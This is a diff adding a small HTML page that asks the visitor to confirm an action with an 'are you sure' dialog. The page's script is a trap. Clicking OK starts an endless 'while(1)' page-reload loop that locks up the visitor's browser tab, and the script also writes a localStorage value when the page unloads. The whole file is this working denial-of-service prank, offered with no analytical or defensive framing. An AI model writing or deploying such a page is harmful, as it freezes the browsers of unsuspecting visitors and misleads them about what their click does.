@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+
+<h2>Are you sure you wanna do this</h2>
+
+
+<p>Hit Ok if you're sure about this</p>
+
+
+<p id="demo"></p>
+
+
+<script>
+onbeforeunload = function(){localStorage.x=1};
+
+
+if(confirm("are you sure about this")){
+  setTimeout(function(){
+    while(1)location.reload(1)
+  }, 1000)
+}
+</script>
+
+
+</body>
+</html>
